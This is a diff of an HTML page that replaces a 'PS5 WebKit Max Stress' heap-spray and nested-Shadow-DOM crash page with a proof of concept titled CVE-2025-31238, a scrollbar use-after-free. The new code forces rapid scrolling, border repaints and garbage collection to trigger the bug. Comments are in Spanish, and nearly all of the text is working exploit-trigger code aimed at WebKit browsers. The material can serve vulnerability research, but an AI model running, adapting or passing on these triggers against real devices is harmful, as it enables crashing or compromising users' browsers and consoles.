@@ -1,98 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS5 WebKit Max Stress</title>
+  <title>CVE-2025-31238 - Scrollbar UAF PoC</title>
   <style>
     body {
-      background: black;
-      color: lime;
-      font-family: monospace;
-      overflow: hidden;
       margin: 0;
-      padding: 0;
+      overflow: hidden;
     }
-    .boom {
-      display: inline-block;
-      margin: 1px;
-      animation: scaleup 0.1s infinite alternate;
-      will-change: transform;
-      color: #0f0;
+    #target {
+      width: 200px;
+      height: 200px;
+      overflow: auto;
+      border: 1px solid red;
     }
-    @keyframes scaleup {
-      0% { transform: scale(1); }
-      100% { transform: scale(3); }
+    #content {
+      width: 100%;
+      height: 5000px;
+      background: linear-gradient(#000, #fff);
     }
   </style>
 </head>
 <body>
-  <pre id="log">[+] PS5 WebKit Max Stress Loaded...</pre>
+  <div id="target">
+    <div id="content"></div>
+  </div>
 
   <script>
-    const log = msg => {
-      const el = document.getElementById("log");
-      el.textContent += "\n" + msg;
-      if (el.textContent.length > 10000) el.textContent = el.textContent.slice(-8000);
-    };
+    const t = document.getElementById("target");
 
-    // String gigante para heap spray
-    const bigStr = "💥".repeat(1000);
+    function triggerUAF() {
+      let count = 0;
 
-    // Arreglo para heap spray
-    const spray = [];
+      function spam() {
+        // Fuerza scroll rápido
+        t.scrollTop = (t.scrollTop + 1000) % 5000;
 
-    // Crear nodos con múltiples niveles de Shadow DOM anidados
-    function createNestedShadow(host, depth) {
-      if (depth === 0) return;
-      const shadow = host.attachShadow({ mode: "open" });
-      const wrapper = document.createElement("div");
-      wrapper.style.display = "contents";
-      for (let i = 0; i < 5; i++) {
-        const span = document.createElement("span");
-        span.textContent = `🔥Level${depth}-${i} ` + bigStr;
-        wrapper.appendChild(span);
-      }
-      shadow.appendChild(wrapper);
-      createNestedShadow(wrapper, depth - 1);
-    }
+        // Crea animaciones forzadas de repintado
+        t.style.borderWidth = `${1 + (count % 5)}px`;
 
-    let frame = 0;
-    function stressLoop() {
-      try {
-        // Heap spray con strings muy grandes
-        for (let i = 0; i < 1000; i++) {
-          spray.push(bigStr + frame + i);
-        }
-
-        // Crear muchos hosts con Shadow DOM anidados
-        for (let i = 0; i < 50; i++) {
-          const host = document.createElement("div");
-          host.className = "boom";
-          host.textContent = "💣" + frame + "_" + i;
-          document.body.appendChild(host);
-          createNestedShadow(host, 8); // 8 niveles anidados
-        }
-
-        // Destruir aleatoriamente nodos antiguos para forzar GC y memoria fragmentada
-        if (document.body.children.length > 3000) {
-          for (let i = 0; i < 500; i++) {
-            const child = document.body.children[Math.floor(Math.random() * document.body.children.length)];
-            if (child) child.remove();
+        // Forzar reflow + GC
+        if (count++ % 10 === 0) {
+          let garbage = [];
+          for (let i = 0; i < 1000; i++) {
+            garbage.push(new Array(1000).fill(Math.random()));
           }
-          log(`[+] Cleaned nodes at frame ${frame}`);
         }
 
-        frame++;
-        if (frame % 10 === 0) log(`[+] Frame ${frame} running...`);
-      } catch (e) {
-        log(`[!] Exception: ${e.message}`);
+        if (count < 10000) {
+          requestAnimationFrame(spam);
+        } else {
+          console.log("[+] Fin del trigger");
+        }
       }
-      requestAnimationFrame(stressLoop);
+
+      spam();
     }
 
-    setTimeout(() => {
-      log("[+] Starting stress loop...");
-      stressLoop();
-    }, 100);
+    setTimeout(triggerUAF, 1000);
   </script>
 </body>
 </html>
